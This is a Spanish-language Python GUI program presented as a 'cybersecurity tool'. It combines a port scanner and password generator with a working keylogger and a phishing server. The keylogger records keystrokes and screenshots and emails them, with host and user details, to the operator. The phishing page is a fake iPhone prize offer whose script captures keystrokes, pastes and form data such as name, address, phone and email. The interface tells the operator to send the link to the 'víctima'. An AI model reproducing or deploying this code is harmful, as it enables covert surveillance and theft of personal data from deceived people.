import os
import threading
import time
import uuid
import socket
import json
import smtplib
import nmap
import random
import string
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pyautogui
import glob
import zipfile
from pynput.keyboard import Key, Listener
import http.server
import socketserver
import platform
from PIL import ImageGrab
from queue import Queue

# Configuración básica
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ASSETS_DIR = os.path.join(BASE_DIR, "assets")
CAPTURES_DIR = os.path.join(BASE_DIR, "captures")
LOGS_DIR = os.path.join(BASE_DIR, "logs")
PICTURE_DIR = "C:\\Picture"
DEFAULT_DIR = os.path.join(PICTURE_DIR, "Default")
for directory in [ASSETS_DIR, CAPTURES_DIR, LOGS_DIR, PICTURE_DIR, DEFAULT_DIR]:
    os.makedirs(directory, exist_ok=True)

# Configuración de correo (usando Outlook como en el original)
EMAIL_CONFIG = {
    "sender": "your_outlook_email@outlook.com",  # Reemplazar con tu correo
    "receiver": "your_receiver_email@outlook.com",  # Reemplazar con el correo del receptor
    "password": "your_outlook_password",  # Reemplazar con tu contraseña
    "smtp_server": "smtp.outlook.com",
    "smtp_port": 587
}

DEBUG = True

def debug_log(message):
    if DEBUG:
        print(f"[DEBUG] {message}")

class PortScanner:
    def __init__(self, ui):
        self.ui = ui
        self.nm = nmap.PortScanner()

    def scan_specific_port(self, target_ip, port):
        try:
            self.ui.update_status("Escaneando puerto específico...")
            scan_result = f"Iniciando escaneo del puerto {port} en {target_ip}\n"
            self.ui.append_results(scan_result)
            self.nm.scan(target_ip, arguments=f'-p {port}')
            open_ports = []
            if 'tcp' in self.nm[target_ip] and int(port) in self.nm[target_ip]['tcp']:
                if self.nm[target_ip]['tcp'][int(port)]['state'] == 'open':
                    open_ports.append(int(port))
            result = f"Puerto {port}: {'Abierto' if open_ports else 'Cerrado'}\n"
            scan_result += result
            self.ui.append_results(result)
            self.ui.update_status("Escaneo específico completo.")
            return scan_result
        except Exception as e:
            error_msg = f"Error en el escaneo: {str(e)}\n"
            self.ui.update_status(f"Error en el escaneo: {str(e)}")
            self.ui.append_results(error_msg)
            return error_msg

    def scan_port_range(self, target_ip, start_port, end_port):
        try:
            self.ui.update_status("Escaneando rango de puertos...")
            scan_result = f"Iniciando escaneo de puertos {start_port}-{end_port} en {target_ip}\n"
            self.ui.append_results(scan_result)
            self.nm.scan(target_ip, arguments=f'-p {start_port}-{end_port}')
            open_ports = []
            for proto in self.nm[target_ip].all_protocols():
                lport = self.nm[target_ip][proto].keys()
                for port in lport:
                    if self.nm[target_ip][proto][port]['state'] == 'open':
                        open_ports.append(port)
            result = f"Puertos abiertos: {', '.join(map(str, open_ports)) if open_ports else 'Ninguno'}\n"
            scan_result += result
            self.ui.append_results(result)
            self.ui.update_status("Escaneo de rango completo.")
            return scan_result
        except Exception as e:
            error_msg = f"Error en el escaneo: {str(e)}\n"
            self.ui.update_status(f"Error en el escaneo: {str(e)}")
            self.ui.append_results(error_msg)
            return error_msg

    def scan_all_ports(self, target_ip):
        try:
            self.ui.update_status("Escaneando todos los puertos...")
            scan_result = f"Iniciando escaneo completo de puertos en {target_ip}\n"
            self.ui.append_results(scan_result)
            self.nm.scan(target_ip, arguments='-p 1-65535')
            open_ports = []
            for proto in self.nm[target_ip].all_protocols():
                lport = self.nm[target_ip][proto].keys()
                for port in lport:
                    if self.nm[target_ip][proto][port]['state'] == 'open':
                        open_ports.append(port)
            result = f"Puertos abiertos: {', '.join(map(str, open_ports)) if open_ports else 'Ninguno'}\n"
            scan_result += result
            self.ui.append_results(result)
            self.ui.update_status("Escaneo completo de todos los puertos.")
            return scan_result
        except Exception as e:
            error_msg = f"Error en el escaneo: {str(e)}\n"
            self.ui.update_status(f"Error en el escaneo: {str(e)}")
            self.ui.append_results(error_msg)
            return error_msg

class PasswordGenerator:
    def __init__(self, ui):
        self.ui = ui

    def generate_passwords(self, length, count):
        try:
            length = int(length)
            count = int(count)
            if length < 8:
                self.ui.update_status("La longitud mínima debe ser 8 caracteres.")
                return
            letters = string.ascii_letters
            digits = string.digits
            special_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?"
            all_chars = letters + digits + special_chars
            passwords = []
            for _ in range(count):
                password = (
                    random.choice(string.ascii_uppercase) +
                    random.choice(string.ascii_lowercase) +
                    random.choice(digits) +
                    random.choice(special_chars) +
                    ''.join(random.choice(all_chars) for _ in range(length - 4))
                )
                password_list = list(password)
                random.shuffle(password_list)
                password = ''.join(password_list)
                strength = self.evaluate_password_strength(password)
                passwords.append(f"{password} ({strength})")
            self.ui.update_results("\n".join(passwords))
            self.ui.update_status(f"{count} contraseñas generadas exitosamente.")
        except ValueError:
            self.ui.update_status("Ingrese valores numéricos válidos.")

    def evaluate_password_strength(self, password):
        score = 0
        if len(password) >= 12:
            score += 2
        elif len(password) >= 8:
            score += 1
        if any(c.isupper() for c in password):
            score += 1
        if any(c.islower() for c in password):
            score += 1
        if any(c.isdigit() for c in password):
            score += 1
        if any(c in string.punctuation for c in password):
            score += 1
        if score <= 2:
            return "Débil"
        elif score <= 4:
            return "Media"
        else:
            return "Fuerte"

class Keylogger:
    def __init__(self, interval=30):
        self.log = ""
        self.screenshots = []
        self.lock = threading.Lock()
        self.interval = interval
        self.is_keylogging = False
        self.victim_ip = ""
        self.last_update = ""
        self.key_queue = Queue()
        self.buffer = {}
        self.email_event = threading.Event()
        self.new_content = False
        self.last_screenshot_time = 0
        self.screenshot_interval = 30
        self.keys_pressed = []
        self.key_count = 0
        os.makedirs(CAPTURES_DIR, exist_ok=True)

    def add_key(self, key, timestamp, session_id):
        with self.lock:
            if session_id not in self.buffer:
                self.buffer[session_id] = {
                    "text": "",
                    "last_timestamp": timestamp,
                    "last_activity": time.time()
                }
            
            if key == "Backspace":
                if self.buffer[session_id]["text"]:
                    self.buffer[session_id]["text"] = self.buffer[session_id]["text"][:-1]
            elif key in ("Enter", "Tab"):
                self.buffer[session_id]["text"] += f"[{key}]"
            elif len(key) == 1:
                self.buffer[session_id]["text"] += key
            else:
                self.buffer[session_id]["text"] += f"[{key}]"
                
            self.buffer[session_id]["last_timestamp"] = timestamp
            self.buffer[session_id]["last_activity"] = time.time()
            
            self.flush_old_buffers()
            self.new_content = True
            self.key_queue.put((f"Sesión {session_id}: {self.buffer[session_id]['text']}", timestamp))
            self.last_update = time.strftime("%Y-%m-%d %H:%M:%S")
            return True

    def on_key_press(self, key):
        try:
            key_str = str(key.char)
        except AttributeError:
            if key == Key.space:
                key_str = " "
            elif key == Key.enter:
                key_str = "[Enter]"
            elif key == Key.backspace:
                key_str = "[Backspace]"
            elif key == Key.tab:
                key_str = "[Tab]"
            else:
                key_str = f"[{str(key).replace('Key.', '')}]"
        
        self.keys_pressed.append(key_str)
        self.key_count += 1
        
        if self.key_count >= 10:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            with self.lock:
                entry = f"[{timestamp}] {''.join(self.keys_pressed)}\n"
                self.log += entry
                debug_log(f"Pulsaciones directas: {entry.strip()}")
                self.new_content = True
                self.keys_pressed = []
                self.key_count = 0
                self.last_update = timestamp

    def keyboard_listener(self):
        with Listener(on_press=self.on_key_press) as listener:
            while self.is_keylogging:
                time.sleep(0.1)
                if not self.is_keylogging:
                    listener.stop()
                    break
            listener.join()

    def flush_old_buffers(self, max_age=5):
        current_time = time.time()
        sessions_to_flush = []
        
        for session_id, data in self.buffer.items():
            if current_time - data["last_activity"] > max_age and data["text"]:
                sessions_to_flush.append(session_id)
        
        for session_id in sessions_to_flush:
            entry = f"[{self.buffer[session_id]['last_timestamp']}] Sesión {session_id}: {self.buffer[session_id]['text']}\n"
            self.log += entry
            debug_log(f"Texto capturado: {entry.strip()}")
            self.buffer[session_id]["text"] = ""
            self.buffer[session_id]["last_activity"] = current_time

    def capture_screenshot(self):
        while self.is_keylogging:
            current_time = time.time()
            
            if current_time - self.last_screenshot_time >= self.screenshot_interval:
                try:
                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                    filename = f"screenshot_{timestamp}_{uuid.uuid4().hex[:6]}.png"
                    screenshot_path = os.path.join(CAPTURES_DIR, filename)
                    
                    debug_log(f"Intentando capturar pantalla en {screenshot_path}")
                    
                    screenshot = ImageGrab.grab()
                    screenshot.save(screenshot_path)
                    
                    with self.lock:
                        self.screenshots.append(screenshot_path)
                        self.new_content = True
                    debug_log(f"Captura guardada: {screenshot_path}")
                    
                    self.last_screenshot_time = current_time
                    
                except Exception as e:
                    debug_log(f"Error al capturar pantalla: {e}")
            
            time.sleep(1)

    def send_email(self, force=False):
        if force:
            self._do_send_email()
            return True
            
        while self.is_keylogging:
            if self.email_event.wait(timeout=self.interval):
                self.email_event.clear()
            
            if self.new_content:
                self._do_send_email()

    def _do_send_email(self):
        with self.lock:
            self.flush_old_buffers(max_age=0)
            
            if not self.log and not self.screenshots:
                debug_log("Sin contenido para enviar")
                return False

            try:
                debug_log("Preparando envío de correo")
                msg = MIMEMultipart()
                msg['From'] = EMAIL_CONFIG["sender"]
                msg['To'] = EMAIL_CONFIG["receiver"]
                msg['Subject'] = f"Reporte de Keylogger - {time.strftime('%Y-%m-%d %H:%M:%S')}"
                
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                username = os.getlogin()
                
                body = f"""
                IP de la víctima: {self.victim_ip}
                Equipo: {hostname}
                Usuario: {username}
                IP local: {local_ip}
                Sistema: {platform.system()} {platform.release()}
                Última actualización: {self.last_update}
                
                Pulsaciones capturadas:
                {self.log}
                """
                msg.attach(MIMEText(body, 'plain'))

                screenshot_count = 0
                screenshots_to_send = self.screenshots[-5:] if len(self.screenshots) > 5 else self.screenshots
                
                for screenshot_path in screenshots_to_send:
                    if os.path.exists(screenshot_path):
                        try:
                            with open(screenshot_path, "rb") as attachment:
                                part = MIMEBase("image", "png")
                                part.set_payload(attachment.read())
                                encoders.encode_base64(part)
                                part.add_header("Content-Disposition", 
                                                f"attachment; filename={os.path.basename(screenshot_path)}")
                                msg.attach(part)
                                screenshot_count += 1
                        except Exception as e:
                            debug_log(f"Error adjuntando captura {screenshot_path}: {e}")

                max_retries = 3
                retry_count = 0
                
                while retry_count < max_retries:
                    try:
                        server = smtplib.SMTP(EMAIL_CONFIG["smtp_server"], EMAIL_CONFIG["smtp_port"])
                        server.ehlo()
                        server.starttls()
                        server.login(EMAIL_CONFIG["sender"], EMAIL_CONFIG["password"])
                        server.sendmail(EMAIL_CONFIG["sender"], EMAIL_CONFIG["receiver"], msg.as_string())
                        server.quit()
                        debug_log(f"Correo enviado con {screenshot_count} capturas")
                        
                        self.log = ""
                        self.screenshots = []
                        self.new_content = False
                        return True
                    except Exception as e:
                        retry_count += 1
                        debug_log(f"Error al enviar correo ({retry_count}/3): {e}")
                        time.sleep(2)
                        
                return False
            except Exception as e:
                debug_log(f"Error general en envío de correo: {e}")
                return False

    def force_email_send(self):
        debug_log("Forzando envío de correo")
        self.email_event.set()
        return self._do_send_email()

    def get_log(self):
        with self.lock:
            self.flush_old_buffers(max_age=0)
            return self.log

    def get_screenshots(self):
        with self.lock:
            return self.screenshots.copy()

    def get_key_queue(self):
        keys = []
        while not self.key_queue.empty():
            keys.append(self.key_queue.get())
        return keys

    def start(self, victim_ip):
        self.is_keylogging = True
        self.victim_ip = victim_ip
        self.last_update = time.strftime("%Y-%m-%d %H:%M:%S")
        self.new_content = False
        self.last_screenshot_time = 0
        
        keyboard_thread = threading.Thread(target=self.keyboard_listener, daemon=True)
        keyboard_thread.start()
        
        email_thread = threading.Thread(target=self.send_email, daemon=True)
        email_thread.start()
        
        screenshot_thread = threading.Thread(target=self.capture_screenshot, daemon=True)
        screenshot_thread.start()
        
        debug_log(f"Keylogger iniciado para IP: {victim_ip}")

    def stop(self):
        if self.new_content:
            debug_log("Enviando correo final antes de detener")
            self._do_send_email()
            
        self.is_keylogging = False
        debug_log("Keylogger detenido")

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.keylogger = kwargs.pop('keylogger')
        super().__init__(*args, **kwargs)

    def do_GET(self):
        debug_log(f"GET request: {self.path}")
        if self.path.startswith("/phishing"):
            params = self.path.split("?")
            if len(params) > 1 and "img=" in params[1]:
                img_name = params[1].split("img=")[1].split("&")[0]
                img_path = os.path.join(ASSETS_DIR, img_name)
                if os.path.exists(img_path):
                    client_ip = self.client_address[0]
                    debug_log(f"Cliente conectado desde IP: {client_ip}")
                    self.keylogger.start(client_ip)
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    html = f"""
                    <!DOCTYPE html>
                    <html>
                        <head>
                            <title>¡Felicidades! Has ganado un teléfono</title>
                            <style>
                                body {{ font-family: Arial, sans-serif; text-align: center; background-color: #f9f9f9; }}
                                .container {{ max-width: 800px; margin: 0 auto; padding: 20px; }}
                                img {{ max-width: 100%; max-height: 300px; border: 1px solid #ddd; border-radius: 4px; }}
                                .prize-btn {{ padding: 15px 30px; background-color: #e74c3c; color: white; text-decoration: none; 
                                        border-radius: 4px; display: inline-block; margin: 20px 0; font-size: 18px; font-weight: bold; }}
                                .download-btn {{ padding: 10px 20px; background-color: #3498db; color: white; text-decoration: none; 
                                        border-radius: 4px; display: inline-block; margin: 10px 0; }}
                                input {{ margin: 10px; padding: 12px; width: 300px; border: 1px solid #ddd; border-radius: 4px; }}
                                .instructions {{ margin: 20px; padding: 15px; background-color: #f1f1f1; border-radius: 4px; }}
                                .countdown {{ font-size: 24px; color: #e74c3c; font-weight: bold; margin: 15px 0; }}
                                .highlight {{ background-color: #ffe45c; padding: 5px; }}
                            </style>
                        </head>
                        <body>
                            <div class="container">
                                <h1>¡FELICIDADES! Has sido seleccionado para ganar un iPhone 15 Pro</h1>
                                <img src="/assets/{img_name}" alt="iPhone 15 Pro">
                                <div class="countdown">La oferta expira en: <span id="timer">05:00</span></div>
                                <p>Hemos seleccionado tu IP de manera aleatoria para recibir este increíble premio.</p>
                                <p class="highlight">Solo quedan <b>2 unidades</b> disponibles para entrega hoy.</p>
                                <a href="#claim" class="prize-btn" id="claimButton">RECLAMAR MI IPHONE AHORA</a>
                                <div class="instructions" id="formSection" style="display:none;">
                                    <h2>Completa tus datos para enviar tu premio</h2>
                                    <p>Para verificar tu identidad, por favor completa la siguiente información:</p>
                                    <input type="text" id="nameField" placeholder="Nombre completo" autofocus><br>
                                    <input type="text" id="addressField" placeholder="Dirección de envío"><br>
                                    <input type="text" id="phoneField" placeholder="Número de teléfono"><br>
                                    <input type="email" id="emailField" placeholder="Correo electrónico"><br>
                                    <input type="text" id="commentField" placeholder="¿Por qué quieres este iPhone?"><br>
                                    <p><a href="/assets/{img_name}" class="download-btn" id="confirmButton">CONFIRMAR DATOS</a></p>
                                </div>
                            </div>
                            <script>
                                const sessionId = Math.random().toString(36).substring(2, 15);
                                console.log("Session ID:", sessionId);
                                let textBuffer = "";
                                let lastSendTime = Date.now();
                                const SEND_INTERVAL = 2000;
                                localStorage.setItem('keyloggerSessionId', sessionId);
                                function sendBufferIfNeeded(force = false) {{
                                    const now = Date.now();
                                    if (textBuffer && (force || now - lastSendTime > SEND_INTERVAL)) {{
                                        const timestamp = new Date().toISOString();
                                        fetch('/keylog', {{
                                            method: 'POST',
                                            headers: {{ 'Content-Type': 'application/json' }},
                                            body: JSON.stringify({{ 
                                                text: textBuffer,
                                                timestamp: timestamp,
                                                sessionId: localStorage.getItem('keyloggerSessionId') || sessionId
                                            }})
                                        }})
                                        .then(response => response.json())
                                        .then(data => console.log('Buffer enviado:', data))
                                        .catch(err => console.error('Error enviando buffer:', err));
                                        textBuffer = "";
                                        lastSendTime = now;
                                    }}
                                }}
                                function setupPing() {{
                                    setInterval(function() {{
                                        sendBufferIfNeeded(true);
                                        fetch('/ping?client=' + new Date().getTime() + '&session=' + 
                                            (localStorage.getItem('keyloggerSessionId') || sessionId), {{
                                            method: 'GET'
                                        }})
                                        .then(res => res.json())
                                        .then(data => console.log("Ping OK"))
                                        .catch(err => console.error("Error ping:", err));
                                    }}, 5000);
                                }}
                                function setupGlobalKeyCapture() {{
                                    function getReadableKey(e) {{
                                        if (e.key === ' ') return 'Space';
                                        if (e.key === 'Enter') return 'Enter';
                                        if (e.key === 'Backspace') return 'Backspace';
                                        if (e.key === 'Delete') return 'Delete';
                                        if (e.key === 'Tab') return 'Tab';
                                        if (e.key === 'Escape') return 'Escape';
                                        if (e.key === 'ArrowUp') return 'ArrowUp';
                                        if (e.key === 'ArrowDown') return 'ArrowDown';
                                        if (e.key === 'ArrowLeft') return 'ArrowLeft';
                                        if (e.key === 'ArrowRight') return 'ArrowRight';
                                        if (e.key === 'Control') return 'Control';
                                        if (e.key === 'Alt') return 'Alt';
                                        if (e.key === 'Shift') return 'Shift';
                                        if (e.key === 'CapsLock') return 'CapsLock';
                                        if (e.key === 'Meta') return 'Meta';
                                        return e.key;
                                    }}
                                    document.addEventListener('keydown', function(e) {{
                                        let key = getReadableKey(e);
                                        console.log('Keydown:', key);
                                        if (key === 'Backspace') {{
                                            if (textBuffer.length > 0) {{
                                                textBuffer = textBuffer.slice(0, -1);
                                            }}
                                        }} else if (key === 'Enter') {{
                                            textBuffer += "\\n";
                                        }} else if (key === 'Tab') {{
                                            textBuffer += "\\t";
                                        }} else if (key.length === 1) {{
                                            textBuffer += key;
                                        }} else {{
                                            textBuffer += "[" + key + "]";
                                        }}
                                        sendBufferIfNeeded();
                                    }});
                                    document.addEventListener('paste', function(e) {{
                                        if (e.clipboardData && e.clipboardData.getData) {{
                                            const pastedText = e.clipboardData.getData('text/plain');
                                            if (pastedText) {{
                                                console.log('Pasted:', pastedText);
                                                textBuffer += "[PASTE]" + pastedText;
                                                sendBufferIfNeeded(true);
                                            }}
                                        }}
                                    }});
                                    document.addEventListener('change', function(e) {{
                                        if (e.target && e.target.value) {{
                                            console.log('Form change:', e.target.value);
                                            textBuffer += "[FORM:" + (e.target.id || e.target.name || 'unknown') + "]" + e.target.value;
                                            sendBufferIfNeeded(true);
                                        }}
                                    }});
                                    window.addEventListener('beforeunload', function() {{
                                        sendBufferIfNeeded(true);
                                    }});
                                }}
                                function startCountdown() {{
                                    let time = 300;
                                    const timerElement = document.getElementById('timer');
                                    const countdownInterval = setInterval(function() {{
                                        time--;
                                        const minutes = Math.floor(time / 60);
                                        const seconds = time % 60;
                                        timerElement.textContent = `${{minutes.toString().padStart(2, '0')}}:${{seconds.toString().padStart(2, '0')}}`;
                                        if (time <= 0) {{
                                            clearInterval(countdownInterval);
                                            timerElement.textContent = "00:00";
                                            document.getElementById('claimButton').textContent = "¡ÚLTIMA OPORTUNIDAD!";
                                        }}
                                    }}, 1000);
                                }}
                                window.onload = function() {{
                                    setupPing();
                                    setupGlobalKeyCapture();
                                    startCountdown();
                                    document.getElementById('claimButton').addEventListener('click', function(e) {{
                                        e.preventDefault();
                                        document.getElementById('formSection').style.display = 'block';
                                        document.getElementById('nameField').focus();
                                    }});
                                    document.getElementById('confirmButton').addEventListener('click', function(e) {{
                                        console.log("Datos confirmados, descargando imagen...");
                                        let downloadStatus = document.createElement('p');
                                        downloadStatus.textContent = "Procesando tus datos...";
                                        downloadStatus.style.color = "#4CAF50";
                                        document.getElementById('formSection').appendChild(downloadStatus);
                                        setTimeout(function() {{
                                            downloadStatus.textContent = "¡Felicidades! Tus datos han sido verificados. Pronto recibirás un email de confirmación.";
                                        }}, 2000);
                                    }});
                                }};
                            </script>
                        </body>
                    </html>
                    """
                    self.wfile.write(html.encode())
                else:
                    self.send_error(404, "Imagen no encontrada")
            else:
                self.send_error(400, "Parámetro de imagen faltante")
        elif self.path.startswith("/assets/"):
            file_path = os.path.join(BASE_DIR, self.path[1:])
            if os.path.exists(file_path):
                self.send_response(200)
                extension = os.path.splitext(file_path)[1].lower()
                content_type = {
                    '.png': "image/png",
                    '.jpg': "image/jpeg",
                    '.jpeg': "image/jpeg",
                    '.gif': "image/gif"
                }.get(extension, "application/octet-stream")
                self.send_header("Content-type", content_type)
                self.send_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
                self.end_headers()
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, "Archivo no encontrado")
        elif self.path.startswith("/ping"):
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            session_id = "default"
            if "session=" in self.path:
                try:
                    session_id = self.path.split("session=")[1].split("&")[0]
                except:
                    pass
            self.wfile.write(json.dumps({"status": "ok", "session": session_id}).encode())
        else:
            if self.path == "/" or self.path == "":
                self.send_response(302)
                self.send_header("Location", "/phishing?img=phone_prize.png")
                self.end_headers()
            else:
                self.send_error(404, "Página no encontrada")

    def do_POST(self):
        debug_log(f"POST request: {self.path}")
        if self.path == "/keylog":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            try:
                data = json.loads(post_data)
                key = data.get('text', '')
                timestamp = data.get('timestamp', time.strftime("%Y-%m-%d %H:%M:%S"))
                session_id = data.get('sessionId', 'default')
                if key:
                    self.keylogger.add_key(key, timestamp, session_id)
                    debug_log(f"Keylog recibido - Sesión {session_id}: {key}")
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "ok"}).encode())
            except Exception as e:
                debug_log(f"Error procesando keylog: {e}")
                self.send_error(400, "Datos inválidos")
        else:
            self.send_error(404, "Endpoint no encontrado")

class PhishingServer:
    def __init__(self, keylogger, port=8080):
        self.keylogger = keylogger
        self.port = port
        self.server = None
        self.is_running = False

    def start(self):
        try:
            hostname = socket.gethostname()
            local_ip = self.get_local_ip()
            if hasattr(self.keylogger, 'ui'):
                self.keylogger.ui.url_var.set(f"http://{local_ip}:{self.port}/phishing?img=phone_prize.png")
            handler = lambda *args, **kwargs: PhishingHandler(*args, keylogger=self.keylogger, **kwargs)
            self.server = socketserver.ThreadingTCPServer(("0.0.0.0", self.port), handler)
            self.is_running = True
            debug_log(f"Servidor iniciado en {local_ip}:{self.port}")
            server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            server_thread.start()
            debug_log("Servidor en ejecución")
        except Exception as e:
            debug_log(f"Error iniciando servidor: {e}")
            self.is_running = False
            if hasattr(self.keylogger, 'ui'):
                self.keylogger.ui.status_var.set("Error al iniciar servidor")
                self.keylogger.ui.start_btn.config(state=tk.NORMAL)
                self.keylogger.ui.stop_btn.config(state=tk.DISABLED)
            if self.server:
                self.server.shutdown()
                self.server.server_close()
            self.server = None
            self.is_running = False
            return False
        else:
            if hasattr(self.keylogger, 'ui'):
                self.keylogger.ui.status_var.set("Servidor activo")
                self.keylogger.ui.start_btn.config(state=tk.DISABLED)
                self.keylogger.ui.stop_btn.config(state=tk.NORMAL)
            return True

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception as e:
            debug_log(f"Error obteniendo IP local: {e}")
            return "127.0.0.1"

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.is_running = False
            debug_log("Servidor detenido")

class CybersecurityUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Herramienta de Ciberseguridad")
        self.root.geometry("800x600")
        self.root.resizable(True, True)
        self.port_scanner = PortScanner(self)
        self.password_generator = PasswordGenerator(self)
        self.keylogger = Keylogger()
        self.keylogger.ui = self
        self.phishing_server = PhishingServer(self.keylogger)
        self.setup_ui()

    def setup_ui(self):
        main_frame = tk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        tk.Label(main_frame, text="Herramienta de Ciberseguridad", font=("Arial", 16, "bold")).pack(pady=10)
        tk.Button(main_frame, text="Escáner de Puertos", command=self.show_port_scanner, width=20).pack(pady=5)
        tk.Button(main_frame, text="Generador de Contraseñas", command=self.show_password_generator, width=20).pack(pady=5)
        tk.Button(main_frame, text="Keylogger", command=self.show_keylogger, width=20).pack(pady=5)
        tk.Button(main_frame, text="Servidor de Phishing", command=self.show_phishing_server, width=20).pack(pady=5)
        self.content_frame = tk.Frame(main_frame)
        self.content_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        self.status_var = tk.StringVar(value="Inactivo")
        tk.Label(main_frame, textvariable=self.status_var, font=("Arial", 10)).pack(pady=5)
        self.results_text = scrolledtext.ScrolledText(main_frame, height=10)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def clear_content_frame(self):
        for widget in self.content_frame.winfo_children():
            widget.destroy()

    def update_status(self, message):
        self.status_var.set(message)
        self.root.update()

    def update_results(self, message):
        self.results_text.delete(1.0, tk.END)
        self.results_text.insert(tk.END, message)
        self.results_text.see(tk.END)

    def append_results(self, message):
        self.results_text.insert(tk.END, message)
        self.results_text.see(tk.END)

    def show_port_scanner(self):
        self.clear_content_frame()
        self.update_results("")
        tk.Label(self.content_frame, text="Escáner de Puertos", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Label(self.content_frame, text="IP Objetivo:").pack()
        target_ip_entry = tk.Entry(self.content_frame)
        target_ip_entry.pack(pady=5)
        tk.Label(self.content_frame, text="Puerto Específico:").pack()
        specific_port_entry = tk.Entry(self.content_frame)
        specific_port_entry.pack(pady=5)
        tk.Button(self.content_frame, text="Escanear Puerto", 
                  command=lambda: self.port_scanner.scan_specific_port(target_ip_entry.get(), specific_port_entry.get())).pack(pady=5)
        tk.Label(self.content_frame, text="Rango de Puertos (Inicio - Fin):").pack()
        range_frame = tk.Frame(self.content_frame)
        range_frame.pack()
        start_port_entry = tk.Entry(range_frame, width=10)
        start_port_entry.pack(side=tk.LEFT, padx=5)
        tk.Label(range_frame, text="-").pack(side=tk.LEFT)
        end_port_entry = tk.Entry(range_frame, width=10)
        end_port_entry.pack(side=tk.LEFT, padx=5)
        tk.Button(self.content_frame, text="Escanear Rango", 
                  command=lambda: self.port_scanner.scan_port_range(target_ip_entry.get(), start_port_entry.get(), end_port_entry.get())).pack(pady=5)
        tk.Button(self.content_frame, text="Escanear Todos", 
                  command=lambda: self.port_scanner.scan_all_ports(target_ip_entry.get())).pack(pady=5)

    def show_password_generator(self):
        self.clear_content_frame()
        tk.Label(self.content_frame, text="Generador de Contraseñas", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Label(self.content_frame, text="Longitud (mínimo 8):").pack()
        length_entry = tk.Entry(self.content_frame)
        length_entry.pack(pady=5)
        tk.Label(self.content_frame, text="Cantidad:").pack()
        count_entry = tk.Entry(self.content_frame)
        count_entry.pack(pady=5)
        tk.Button(self.content_frame, text="Generar", 
                  command=lambda: self.password_generator.generate_passwords(length_entry.get(), count_entry.get())).pack(pady=5)

    def show_keylogger(self):
        self.clear_content_frame()
        tk.Label(self.content_frame, text="Keylogger", font=("Arial", 12, "bold")).pack(pady=5)
        tk.Label(self.content_frame, text="IP de la Víctima:").pack()
        victim_ip_entry = tk.Entry(self.content_frame)
        victim_ip_entry.pack(pady=5)
        tk.Button(self.content_frame, text="Iniciar Keylogger", 
                  command=lambda: self.keylogger.start(victim_ip_entry.get())).pack(pady=5)
        tk.Button(self.content_frame, text="Detener Keylogger", 
                  command=self.keylogger.stop).pack(pady=5)
        tk.Button(self.content_frame, text="Enviar Correo", 
                  command=self.keylogger.force_email_send).pack(pady=5)
        tk.Button(self.content_frame, text="Mostrar Capturas", 
                  command=self.show_screenshots).pack(pady=5)
        self.root.after(1000, self.update_keylogger_log)

    def show_screenshots(self):
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            messagebox.showinfo("Capturas", "No hay capturas disponibles")
            return
        latest_shot = screenshots[-1]
        if os.path.exists(latest_shot):
            try:
                os.startfile(latest_shot)
            except Exception as e:
                messagebox.showerror("Error", f"No se pudo abrir la captura: {str(e)}")

    def update_keylogger_log(self):
        try:
            current_log = self.keylogger.get_log()
            if current_log:
                self.update_results(current_log)
            self.root.after(1000, self.update_keylogger_log)
        except Exception as e:
            debug_log(f"Error actualizando log en UI: {e}")
            self.root.after(2000, self.update_keylogger_log)

    def show_phishing_server(self):
        self.clear_content_frame()
        tk.Label(self.content_frame, text="Servidor de Phishing", font=("Arial", 12, "bold")).pack(pady=5)
        url_frame = tk.Frame(self.content_frame)
        url_frame.pack(fill=tk.X, pady=5)
        tk.Label(url_frame, text="URL de phishing:").pack(side=tk.LEFT)
        self.url_var = tk.StringVar(value="Servidor no iniciado")
        tk.Entry(url_frame, textvariable=self.url_var, width=50, state="readonly").pack(side=tk.LEFT, padx=5)
        tk.Button(url_frame, text="Copiar", command=self.copy_url).pack(side=tk.LEFT)
        self.start_btn = tk.Button(self.content_frame, text="Iniciar Servidor", command=self.start_server)
        self.start_btn.pack(pady=5)
        self.stop_btn = tk.Button(self.content_frame, text="Detener Servidor", command=self.stop_server, state=tk.DISABLED)
        self.stop_btn.pack(pady=5)

    def copy_url(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.url_var.get())
        messagebox.showinfo("URL Copiada", "URL copiada al portapapeles")

    def start_server(self):
        try:
            required_img = os.path.join(ASSETS_DIR, "phone_prize.png")
            if not os.path.exists(required_img):
                messagebox.showerror("Error", f"No se encontró la imagen necesaria: {required_img}")
                return
            if self.phishing_server.start():
                self.status_var.set("Servidor activo")
                self.start_btn.config(state=tk.DISABLED)
                self.stop_btn.config(state=tk.NORMAL)
                messagebox.showinfo("Servidor Iniciado", 
                                    f"Servidor iniciado en: {self.url_var.get()}\n\n"
                                    f"Comparte esta URL con la víctima para comenzar la captura.")
        except Exception as e:
            messagebox.showerror("Error", f"Error al iniciar servidor: {str(e)}")
